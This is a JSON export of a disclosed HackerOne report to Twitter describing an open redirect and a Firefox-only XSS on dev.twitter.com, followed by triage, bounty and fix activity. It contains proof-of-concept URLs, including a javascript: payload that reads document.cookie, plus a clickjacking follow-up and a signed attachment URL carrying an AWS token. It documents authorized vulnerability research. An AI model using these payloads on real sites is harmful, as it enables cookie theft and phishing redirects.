{"id":260744,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjA3NDQ=","url":"https://hackerone.com/reports/260744","title":"[dev.twitter.com] XSS and Open Redirect","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-08-16T16:30:43.579Z","submitted_at":"2017-08-16T16:30:43.579Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-09-29T23:07:42.313Z","bug_reporter_agreed_on_going_public_at":"2017-09-28T17:50:02.473Z","team_member_agreed_on_going_public_at":"2017-09-29T23:07:42.265Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n===\nXSS via Request-URI which requires user interaction. The vulnerability is caused by the difference in the Request-URI processing in the Location header and in the link on the page.\nBy creating an incorrect port in the link on the Location header, you can block the redirection for the FireFox browser. Next, using the difference in the processing, generate a \"javascript\" link on the page.\n\nPoC: Open Redirect\n===\nBrowsers: Chrome, FireFox, Opera\n```\nhttps://dev.twitter.com/https:/%5cblackfan.ru/\n```\nHTTP Response:\n```http\nHTTP/1.1 302 Found\nconnection: close\n...\nlocation: https:/\\blackfan.ru\n```\n\nPoC: XSS\n===\nBrowsers: FireFox\nSteps to reproduce: Open and click the link\n```\nhttps://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/\n```\nHTTP Response:\n```http\nHTTP/1.1 302 Found\nconnection: close\n...\nlocation: //x:1/://dev.twitter.com/\u0001javascript:alert(document.cookie)\n...\n\n\n\u003cp\u003eYou should be redirected automatically to target URL: \u003ca href=\"\u0001javascript:alert(document.cookie)\"\u003e\u0001javascript:alert(document.cookie)\u003c/a\u003e.  If not click the link.\n```\n{F213436}\n","bounty_amount":"1120.0","formatted_bounty":"$1,120","original_report_id":null,"original_report_url":null,"attachments":[{"id":213436,"file_name":"Screenshot_at_20-24-11.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/436/afb02d6500aaf740bb8158743d333aac3987297a/Screenshot_at_20-24-11.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_20-24-11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_20-24-11.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143230Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2c181cb82fe583b454f713d46c3ef6cd96d6e72e783b5edba30f5d009078193e","file_size":40137,"type":"image/png"}],"allow_singular_disclosure_at":"2017-10-28T17:50:02.517Z","allow_singular_disclosure_after":-124749748.38733335,"singular_disclosure_allowed":true,"vote_count":64,"voters":["davidfegyver","jensec","sp1d3rs","msultan","europa","testt0","bobrov","hunter","abze","bl4de","and 54 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1933851,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Since the site does not restrict use in the frame using the X-Frame-Options header, this XSS can be used in Clickjacking attacks.\n\nPoC is made using Burp Clickbandit.\nBrowsers: FireFox\nhttps://blackfan.ru/bugbounty/aosigbnsaiodgubsiub328hr9238h_twitter.html","automated_response":false,"created_at":"2017-08-16T16:48:58.106Z","updated_at":"2017-08-16T16:48:58.106Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1953132,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2017-08-24T21:16:42.777Z","updated_at":"2017-08-24T21:16:42.777Z","actor":{"username":"aarun","cleared":false,"url":"/aarun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/486/bcf774a6460ff9e33545235af9344be33732008d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1995379,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned weâ€™ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","automated_response":false,"created_at":"2017-09-13T20:37:00.272Z","updated_at":"2017-09-13T20:37:00.272Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"bounty_amount":"1120.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2029328,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Vulnerability fixed","automated_response":false,"created_at":"2017-09-28T08:01:27.855Z","updated_at":"2017-09-28T08:01:27.855Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2030752,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Thanks for confirming the same!\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2017-09-28T17:30:29.225Z","updated_at":"2017-09-28T17:30:29.225Z","actor":{"username":"aarun","cleared":false,"url":"/aarun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/486/bcf774a6460ff9e33545235af9344be33732008d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2030800,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-28T17:50:02.491Z","updated_at":"2017-09-28T17:50:02.491Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2034552,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-29T23:07:42.283Z","updated_at":"2017-09-29T23:07:42.283Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2034553,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-09-29T23:07:42.330Z","updated_at":"2017-09-29T23:07:42.330Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":5471,"category":"researcher","content":"http://blog.blackfan.ru/2017/09/devtwittercom-xss.html","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2205,"username":"bobrov","name":"Sergey Bobrov","bio":"@Black2Fan","cleared":false,"website":"https://twitter.com/Black2Fan","location":"Russia","created_at":"2014-01-14T04:31:42.053Z","url":"https://hackerone.com/bobrov","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}